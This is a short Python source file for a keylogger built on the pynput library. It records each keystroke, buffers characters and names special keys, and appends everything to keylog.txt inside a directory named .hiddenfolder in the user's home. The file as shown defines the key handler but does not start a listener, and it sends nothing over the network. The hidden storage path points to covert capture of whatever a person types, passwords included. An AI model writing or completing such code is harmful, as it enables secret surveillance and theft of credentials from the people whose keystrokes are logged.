import logging
import os
from pynput import keyboard

log_dir = os.path.join(os.path.expanduser("~"), ".hiddenfolder")
os.makedirs(log_dir, exist_ok=True)

log_file_path = os.path.join(log_dir, "keylog.txt")
keystroke_logger = logging.getLogger('keystroke_logger')
keystroke_logger.setLevel(logging.INFO)

# preventing duplicates 
if not keystroke_logger.handlers:
    handler = logging.FileHandler(log_file_path, mode='a')
    formatter = logging.Formatter('%(message)s')
    handler.setFormatter(formatter)
    keystroke_logger.addHandler(handler)

buffer = []

def flush_buffer():
    if buffer:
        keystroke_logger.info(''.join(buffer), extra={'no_newline': True})
        buffer.clear()

def on_press(key):
    global buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            buffer.append(key.char)
        else:
            flush_buffer()
            keystroke_logger.info(f'[{key.name}]', extra={'no_newline': True})

        if key == keyboard.Key.space:
            buffer.append(' ')
            flush_buffer()
        elif key == keyboard.Key.enter:
            buffer.append('\n')
            flush_buffer()

    except AttributeError:
        flush_buffer()
        keystroke_logger.info(f'[{key.name}]', extra={'no_newline': True})
